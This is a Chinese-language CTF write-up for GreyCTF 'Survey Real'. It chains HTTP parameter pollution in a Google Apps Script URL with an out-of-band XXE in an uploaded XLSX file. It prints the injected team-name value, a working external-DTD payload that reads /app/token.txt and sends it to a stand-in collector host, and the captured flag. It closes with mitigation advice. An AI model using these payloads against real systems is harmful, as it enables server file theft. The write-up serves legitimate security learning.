# GreyCTF Survey Real

## 题目简述

Google Form 的 Apps Script 把用户控制的队名直接拼进后端 URL，允许 HTTP 参数污染并替换合法的 `challenge_file_id`。后端随后下载指定 XLSX，使用允许外部 DTD 和网络访问的 lxml 解析 `xl/sharedStrings.xml`，可通过带外 XXE 读取 `/app/token.txt`，再换取 flag。

## 解题过程

Apps Script 构造的请求形如：

```javascript
fetch(".../form_response?teamname=" + teamname +
      "&challenge_file_id=" + legitimateFileId, options)
```

把队名设置成类似：

```text
x&challenge_file_id=ATTACKER_FILE_ID
```

最终 URL 中出现两个同名参数。Flask 的 `request.args.get("challenge_file_id")` 取第一个值，所以后端在 Apps Script 携带正确 POST token 的情况下，下载攻击者准备的 XLSX。

XLSX 本质是 ZIP。保留正常工作簿结构，只替换 `xl/sharedStrings.xml`，在 DOCTYPE 中引用外部 DTD：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE sst [
  <!ENTITY % remote SYSTEM "https://files.example/exploit.dtd">
  %remote;
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <si><t>Name</t></si>
</sst>
```

外部 DTD 读取 token，并把内容嵌入带外请求：

```xml
<!ENTITY % file SYSTEM "file:///app/token.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://collector.example/leak?x=%file;'>">
%eval;
%exfil;
```

后端明确使用 `XMLParser(load_dtd=True, no_network=False)`，因此解析 shared strings 时会读取本地文件并访问收集端。得到 32 位十六进制 token 后，请求 `/flag?token=RECOVERED_TOKEN`，返回：

```text
grey{3xc3l_15_b357_d474b453_f0r_xx3}
```

## 方法总结

利用链包含两个独立边界错误：未编码的 URL 参数让攻击者替换文件 ID，XLSX 内的 XML 又以危险配置解析外部实体。构造 URL 应使用参数 API，而非字符串拼接；解析任何 Office Open XML 内容都应禁用 DTD、实体解析和网络访问，并对下载源与文件大小进行限制。赛时表单、Drive 和 webhook 地址均非机制必需，归档中无需保留。
